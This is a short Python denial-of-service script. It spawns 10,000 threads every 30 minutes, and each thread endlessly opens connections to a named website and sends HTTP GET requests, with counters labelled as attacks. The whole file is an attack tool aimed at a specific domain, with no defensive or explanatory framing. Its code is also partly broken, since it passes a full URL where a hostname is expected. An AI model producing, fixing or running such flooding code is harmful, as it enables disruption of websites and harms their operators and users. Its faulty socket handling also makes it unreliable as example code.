import socket
import threading, time


target = 'https://www.blablaface.net/'
port = 80

attack_num = 0

def attack():
    global attack_num
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
        
        attack_num += 1
        print(attack_num)
        
        s.close()



# Function to start multiple attack threads
def start_attack_threads():
    for i in range(10000):
        thread = threading.Thread(target=attack)
        thread.start()

# Main loop to run every 30 minutes
while True:
    start_attack_threads()
    # Wait for 30 minutes (30 minutes * 60 seconds)
    time.sleep(30 * 60)